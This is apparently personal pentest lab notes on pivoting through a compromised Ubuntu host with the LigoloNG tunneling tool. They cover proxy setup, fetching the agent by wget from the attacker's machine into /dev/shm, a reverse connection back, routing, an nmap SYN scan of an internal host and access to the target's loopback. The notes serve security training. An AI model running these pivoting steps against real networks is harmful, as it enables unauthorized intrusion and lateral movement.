---
tags:
  - hack
---

# Pivoting with LigoloNG

Setting up the proxy server (`ligolo-proxy`) requires creating a logical device and launching the server with the appropriate options. LigoloNG supports requesting an SSL cert on demand using LetsEncrypt, but in this example I'll use a self-signed certificate.

```console
$ sudo ip tuntap add user kali mode tun ligolo
$ sudo ip link set ligolo up
$ ifconfig ligolo
ligolo: flags=4241<UP,POINTOPOINT,NOARP,MULTICAST>  mtu 1500
        unspec 00-00-00-00-00-00-00-00-00-00-00-00-00-00-00-00  txqueuelen 500  (UNSPEC)
        RX packets 0  bytes 0 (0.0 B)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 0  bytes 0 (0.0 B)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
$ ligolo-proxy -selfcert -laddr 10.10.15.7:31337
WARN[0000] Using automatically generated self-signed certificates (Not recommended)
INFO[0000] Listening on 10.10.15.7:31337
    __    _             __
   / /   (_)___ _____  / /___        ____  ____ _
  / /   / / __ `/ __ \/ / __ \______/ __ \/ __ `/
 / /___/ / /_/ / /_/ / / /_/ /_____/ / / / /_/ /
/_____/_/\__, /\____/_/\____/     /_/ /_/\__, /
        /____/                          /____/

  Made in France ♥            by @Nicocha30!

ligolo-ng »
```

Installing `ligolo-agent` on the pivot host:

```console
$ ssh ubuntu@t
Warning: Permanently added 't' (ED25519) to the list of known hosts.
ubuntu@t's password:
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64)
...
Last login: Thu May 12 17:27:41 2022
ubuntu@WEB01:~$ ifconfig
ens192: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.129.62.81  netmask 255.255.0.0  broadcast 10.129.255.255
        inet6 fe80::250:56ff:fe94:c815  prefixlen 64  scopeid 0x20<link>
        inet6 dead:beef::250:56ff:fe94:c815  prefixlen 64  scopeid 0x0<global>
        ether 00:50:56:94:c8:15  txqueuelen 1000  (Ethernet)
        RX packets 600  bytes 69545 (69.5 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 115  bytes 12905 (12.9 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
ens224: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.16.5.129  netmask 255.255.254.0  broadcast 172.16.5.255
        inet6 fe80::250:56ff:fe94:98d6  prefixlen 64  scopeid 0x20<link>
        ether 00:50:56:94:98:d6  txqueuelen 1000  (Ethernet)
        RX packets 118  bytes 9870 (9.8 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 69  bytes 4934 (4.9 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 295  bytes 23239 (23.2 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 295  bytes 23239 (23.2 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
ubuntu@WEB01:~$ cd /dev/shm
ubuntu@WEB01:/dev/shm$ wget 10.10.15.7/ligolo-agent
--2024-06-28 16:37:39--  http://10.10.15.7/ligolo-agent
Connecting to 10.10.15.7:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 1503872 (1.4M) [application/octet-stream]
Saving to: ‘ligolo-agent’
ligolo-agent                       100%[================================================================>]   1.43M   318KB/s    in 4.6s
2024-06-28 16:37:44 (318 KB/s) - ‘ligolo-agent’ saved [1503872/1503872]
ubuntu@WEB01:/dev/shm$ chmod +x ligolo-agent
```

Now I can connect from the pivot host back to my proxy server.

On the pivot host:

```console
ubuntu@WEB01:/dev/shm$ ./ligolo-agent -ignore-cert -connect 10.10.15.7:31337
WARN[0000] warning, certificate validation disabled
INFO[0000] Connection established                        addr="10.10.15.7:31337"
```

On the server, the connection appears, and I need to manually select that session to use it:

```console
ligolo-ng » INFO[0153] Agent joined.                                 name=ubuntu@WEB01 remote="10.129.62.81:48662"
[Agent : ubuntu@WEB01] » session
? Specify a session :  [Use arrows to move, type to filter]
> 1 - #1 - ubuntu@WEB01 - 10.129.62.81:48662
```

I can use the command `ifconfig` directly on the proxy server to see what networks are available via the newly connected session:

```console
[Agent : ubuntu@WEB01] » ifconfig
...
┌───────────────────────────────────────────────┐
│ Interface 2                                   │
├──────────────┬────────────────────────────────┤
│ Name         │ ens224                         │
│ Hardware MAC │ 00:50:56:94:98:d6              │
│ MTU          │ 1500                           │
│ Flags        │ up|broadcast|multicast|running │
│ IPv4 Address │ 172.16.5.129/23                │
│ IPv6 Address │ fe80::250:56ff:fe94:98d6/64    │
└──────────────┴────────────────────────────────┘
```

I need to manually add the route for the network I want to pivot to:

```console
$ sudo ip route add 172.16.4.0/23 dev ligolo
```

Then I can start the tunnel on the proxy server:

```console
[Agent : ubuntu@WEB01] » tunnel_start
[Agent : ubuntu@WEB01] » INFO[0455] Starting tunnel to ubuntu@WEB01
```

Now the host is reachable and I can send arbitrary network traffic that wouldn't work if I were using `proxychains` or `sshuttle`, like this SYN scan:

```console
$ sudo nmap -sS -F 172.16.5.19
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-06-28 10:52 CST
Nmap scan report for 172.16.5.19
Host is up (0.65s latency).
Not shown: 92 closed tcp ports (reset)
PORT     STATE SERVICE
53/tcp   open  domain
80/tcp   open  http
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server
Nmap done: 1 IP address (1 host up) scanned in 2.58 seconds
```

You can also access the target's loopback interface using `240.0.0.1`:

```console
$ sudo ip route add 240.0.0.1/32 dev ligolo

$ ping 240.0.0.1
PING 240.0.0.1 (240.0.0.1) 56(84) bytes of data.
64 bytes from 240.0.0.1: icmp_seq=1 ttl=64 time=198 ms
64 bytes from 240.0.0.1: icmp_seq=2 ttl=64 time=193 ms
^C

$ nc 240.0.0.1 5666 -nvz
(UNKNOWN) [240.0.0.1] 5666 (nrpe) open
```
